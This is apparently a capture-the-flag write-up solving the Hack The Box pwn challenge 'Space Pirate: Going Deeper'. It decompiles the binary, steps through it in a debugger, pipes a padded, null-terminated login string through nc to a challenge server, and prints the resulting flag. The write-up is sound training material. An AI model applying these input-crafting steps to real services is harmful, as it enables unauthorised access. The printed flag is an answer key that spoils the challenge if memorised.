# Space Pirate: Going Deeper

## Solution 
### Decompilation & Disassembly

Firstly, I opened it up in Cutter and Decompiled it

```
undefined8 main(void)
{
	int64_t var_18h;	
	int64_t var_10h;
	int64_t var_8h;
	setup();
	banner();
	puts("\x1b[1;34m");
	admin_panel(1, 2, 3);
	return 0;
}
```

```
// WARNING: Could not reconcile some variable overlaps

void admin_panel(uint32_t arg1, uint32_t arg2, uint32_t arg3)
{
    int32_t iVar1;
    undefined4 in_register_00000014;
    undefined4 in_RSI;
    undefined4 in_RDI;
    uint32_t var_48h;
    uint32_t var_40h;
    uint32_t var_38h;
    char *buf;
    uint32_t var_8h;
    
    _var_8h = 0;
    printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld].\n[*] If you want to continue, disable the mechanism or login as admin.\n"
           , CONCAT44(in_RDI, arg1), CONCAT44(in_RSI, arg2), CONCAT44(in_register_00000014, arg3));
    while (((_var_8h != 1 && (_var_8h != 2)) && (_var_8h != 3))) {
        printf("\n1. Disable mechanisms ⚙\xfe0f\n2. Login ✅\n3. Exit 🏃\n>> ");
        _var_8h = read_num();
    }
    if (_var_8h == 1) {
        printf("\n[*] Input: ");
    } else {
        if (_var_8h == 2) {
            printf("\n[*] Username: ");
        } else {
            puts("\n[!] Exiting..\n");
            exit(0x1b39);
        }
    }
    read(0, &buf, 0x39); // Read in 57 characters
    // Compare Argument 1, Argument 2 and Argument 3 with respective values. If any don't match, compare buffer
    if (((CONCAT44(in_RDI, arg1) != 0xdeadbeef) || (CONCAT44(in_RSI, arg2) != 0x1337c0de)) ||
       (CONCAT44(in_register_00000014, arg3) != 0x1337beef)) {
        iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft", &buf, 0x34);
        if (iVar1 != 0) {
            printf("\n%s[-] Authentication failed!\n", "\x1b[1;31m");
            goto code_r0x00400b38;
        }
    }
    printf("\n%s[+] Welcome admin! The secret message is: ", "\x1b[1;32m");
    system("cat flag*");
code_r0x00400b38:
    puts("\n[!] For security reasons, you are logged out..\n");
    return;
}

```

In short, the buffer has to match the string `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft` to pass the authentication.

### Testing Inputs

I tried running it in edb

![](Pasted%20image%2020220514222503.png)

After setting the read instruction at `0x00400aba` (found using Cutter) as a breakpoint, running the binary and jumping over a few instructions, I find what seems to be the comparison of arguments. But then realised the memory location it is looking at is not accessible by the input buffer. 

![](Pasted%20image%2020220514222609.png)

I tried changing the value on the buffer manually in edb to match the string, which worked, and gave me the cmd prompt.

![](Pasted%20image%2020220514225200.png)

### Making Input Buffer match the string

On running it, I found out that even if the string is put in, it won't match due to the newline. One way is to use `\x00` as the string terminator instead, as `\x00` is not picked up in C strings, unlike `\n`

![](Pasted%20image%2020220514225427.png)

I tried this payload

```
$ (sleep 10; python2 -c 'print "2\nDRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft"') | ./sp_going_deeper 
```

![](Pasted%20image%2020220514230533.png)

Since not the whole string went in, I added more padding right after the 2

```
[hacker@hackerbook evtx2json]$ python
Python 3.10.2 (main, Jan 15 2022, 19:56:27) [GCC 11.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("tr4t0R0fth15sp4c3cr4ft")
22
>>> len("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft")
51
>>> 51-22
29
>>> 
```

`0x1f` = **31**

![](Pasted%20image%2020220514231135.png)

![](Pasted%20image%2020220514231449.png)

### Final Server Pwn

```bash
┌──(kali㉿kali)-[~]
└─$ ( python2 -c 'print "2"+" "*29+"\n"+"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00"'; cat) | nc 139.59.184.63 30944                                 127 ⨯


                  Trying to leak information from the pc.. 🖥


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |                                                                                                     
           |   |                                             |    |                                                                                                     
           |   |                                             |    |                                                                                                     
           |   |                                             |    |                                                                                                     
           |   |_____________________________________________|    |                                                                                                     
           |                                                      |                                                                                                     
            \_____________________________________________________/                                                                                                     
                   \_______________________________________/                                                                                                            
                _______________________________________________                                                                                                         
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_                                                                                                      
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_                                                                                                   
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_                                                                                                
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_                                                                                             
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_                                                                                          
:-----------------------------------------------------------------------------:                                                                                         
`---._.-----------------------------------------------------------------._.---'                                                                                         
                                                                                                                                                                        
                                                                                                                                                                        
[*] Safety mechanisms are enabled!                                                                                                                                      
[*] Values are set to: a = [1], b = [2], c = [3].                                                                                                                       
[*] If you want to continue, disable the mechanism or login as admin.                                                                                                   
                                                                                                                                                                        
1. Disable mechanisms ⚙                                                                                                                                                 
2. Login ✅                                                                                                                                                             
3. Exit 🏃                                                                                                                                                              
>>                                                                                                                                                                      
[*] Username:                                                                                                                                                           
[+] Welcome admin! The secret message is: HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}                                                                         
[!] For security reasons, you are logged out..                                                                                                                          
                                                                                                                                                                        
                           
```

## Flag

`HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}`